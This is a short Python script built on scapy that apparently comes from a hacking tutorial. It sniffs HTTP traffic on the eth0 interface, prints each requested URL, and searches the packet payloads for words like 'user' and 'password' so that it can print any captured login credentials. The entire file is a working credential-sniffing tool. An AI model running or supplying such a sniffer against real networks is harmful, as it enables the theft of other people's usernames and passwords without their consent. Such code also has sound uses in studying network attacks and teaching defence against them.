#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface,store=False,prn=show_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "User", "uname", "Uname", "pass", "Pass", "password", "Password", "login", "Login"]
        for i in keywords:
            if i in load:
                return load



def show_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print(url)
        login_info=get_login_info(packet)
        if login_info:
            print(login_info)
sniffer("eth0")
